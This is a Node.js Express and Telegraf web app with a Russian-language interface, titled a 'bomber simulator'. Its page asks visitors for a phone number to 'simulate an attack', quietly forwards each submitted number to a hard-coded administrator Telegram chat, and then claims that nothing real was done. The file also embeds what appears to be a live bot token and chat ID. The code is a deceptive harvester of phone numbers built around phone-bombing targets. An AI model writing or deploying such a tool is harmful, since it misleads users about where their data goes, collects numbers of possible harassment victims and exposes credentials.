const fs = require('fs');
const path = require('path');
const express = require('express');
const helmet = require('helmet');
const { Telegraf } = require('telegraf');
const { execSync } = require('child_process');

if (!fs.existsSync('.env')) {
    const envContent = `
TELEGRAM_BOT_TOKEN= 7507773615:AAFPnpOD_cRRXp7LM6yqS0off78CrhAAEHM
ADMIN_CHAT_ID= 6705414979
PORT=5000
`.trim();
    fs.writeFileSync('.env', envContent);
    console.log('Файл .env создан. Заполните его своими данными.');
    process.exit(1);
}

if (!fs.existsSync('package.json')) {
    const packageContent = {
        name: 'telegram-bomber-simulator',
        version: '1.0.0',
        main: 'app.js',
        scripts: {
            start: 'node app.js'
        },
        dependencies: {
            express: '^4.18.2',
            telegraf: '^4.12.2',
            helmet: '^7.0.0',
            dotenv: '^16.3.1'
        },
        engines: {
            node: '18.x'
        }
    };
    fs.writeFileSync('package.json', JSON.stringify(packageContent, null, 2));
    console.log('Файл package.json создан. Установите зависимости с помощью npm install.');
    process.exit(1);
}

if (!fs.existsSync('render.yaml')) {
    const renderYamlContent = `
services:
  - type: web
    name: MyApp
    env: node
    buildCommand: "npm install"
    startCommand: "npm start"
    envVars:
      - key: TELEGRAM_BOT_TOKEN
        sync: true
      - key: ADMIN_CHAT_ID
        sync: true
`.trim();
    fs.writeFileSync('render.yaml', renderYamlContent);
    console.log('Файл render.yaml создан.');
}

const requiredPackages = ['express', 'telegraf', 'helmet', 'dotenv'];
const installedPackages = Object.keys(require('./package.json').dependencies || {});

const missingPackages = requiredPackages.filter(pkg => !installedPackages.includes(pkg));

if (missingPackages.length > 0) {
    console.log('Устанавливаем недостающие зависимости:', missingPackages.join(', '));
    try {
        execSync('npm install', { stdio: 'inherit' });
        console.log('Зависимости успешно установлены.');
    } catch (error) {
        console.error('Ошибка при установке зависимостей:', error.message);
        process.exit(1);
    }
}

require('dotenv').config();
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const PORT = process.env.PORT || 5000;

if (!TELEGRAM_BOT_TOKEN || !ADMIN_CHAT_ID) {
    console.error('Ошибка: TELEGRAM_BOT_TOKEN и ADMIN_CHAT_ID должны быть заданы в файле .env.');
    process.exit(1);
}

const app = express();
const bot = new Telegraf(TELEGRAM_BOT_TOKEN);

app.use(helmet());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Симулятор бомбера</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                text-align: center;
                margin: 0;
                padding: 0;
                background: #f5f5f5; /* Серый фон с оттенком белого */
                color: #333;
            }
            .container {
                margin-top: 100px;
            }
            input {
                padding: 15px;
                margin: 15px;
                width: 300px;
                border: 1px solid #ccc;
                border-radius: 5px;
                font-size: 16px;
            }
            button {
                padding: 15px 30px;
                background: #007BFF;
                color: white;
                border: none;
                border-radius: 5px;
                cursor: pointer;
                font-size: 16px;
                transition: background 0.3s ease;
            }
            button:hover {
                background: #0056b3;
            }
            h1 {
                font-size: 36px;
                margin-bottom: 20px;
            }
            p {
                font-size: 18px;
                margin-bottom: 30px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Симулятор бомбера</h1>
            <p>Введите номер телефона для симуляции атаки:</p>
            <form action="/submit" method="POST">
                <input type="text" name="phone_number" placeholder="Введите номер телефона" required>
                <br>
                <button type="submit">Начать атаку</button>
            </form>
        </div>
    </body>
    </html>
    `);
});

app.post('/submit', async (req, res) => {
    const phoneNumber = req.body.phone_number;
    if (phoneNumber) {
        try {
            
            await bot.telegram.sendMessage(ADMIN_CHAT_ID, `Получен номер телефона: ${phoneNumber}`);
            res.redirect('/simulator');
        } catch (error) {
            console.error('Ошибка отправки сообщения в Telegram:', error);
            res.status(500).send('Произошла ошибка при отправке номера телефона.');
        }
    } else {
        res.status(400).send('Ошибка: номер телефона не указан.');
    }
});

app.get('/simulator', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Симуляция бомбера</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                text-align: center;
                margin: 0;
                padding: 0;
                background: #f5f5f5; /* Серый фон с оттенком белого */
                color: #333;
            }
            .container {
                margin-top: 100px;
            }
            h1 {
                font-size: 36px;
                margin-bottom: 20px;
            }
            p {
                font-size: 18px;
                margin-bottom: 30px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Симуляция бомбера</h1>
            <p>Это симуляция. Никаких реальных действий не выполняется.</p>
        </div>
    </body>
    </html>
    `);
});

app.listen(PORT, () => {
    console.log(`Сервер запущен на http://localhost:${PORT}`);
});